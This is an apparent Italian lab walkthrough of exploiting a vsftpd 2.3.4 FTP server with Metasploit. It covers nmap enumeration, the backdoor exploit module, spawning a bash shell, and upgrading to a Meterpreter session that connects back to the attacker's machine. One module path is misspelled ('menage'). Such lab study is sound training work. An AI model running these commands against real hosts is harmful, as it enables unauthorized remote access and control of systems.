# Exploiting A Vulnerable FTP Server

<figure><img src="../../../.gitbook/assets/image (1111).png" alt=""><figcaption></figcaption></figure>

## Preparazione ambiente

```
service postgresql start
msfconsole
workspace -a vsftpd2.3.4
setg RHOSTS 192.209.183.3
workspace
```

<figure><img src="../../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>

## Enumeration e ricerca vulnerabilità

```
db_nmap -sS -sV -O 192.209.183.3
services
vulns
analyze
search vsftpd
```

<figure><img src="../../../.gitbook/assets/image (1113).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>

## Utilizzo exploit MSF

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
info
run
ls
/bin/bash -i
```

<figure><img src="../../../.gitbook/assets/image (1115).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>

### Upgrade da command shell a Meterpreter shell (Post exploitation)

```
CTRL+Z // per mettere in background la sessione, così da fare upgrade a shell meterpreter da cmd
sessions
search shell_to_meterpreter
use post/multi/menage/shell_to_meterpreter
show options
set LHOST eth1 //al kali linux IP
set SESSION 1
run
sessions
sessions 2
sysinfo
getuid
```

<figure><img src="../../../.gitbook/assets/image (1119).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1121).png" alt=""><figcaption></figcaption></figure>
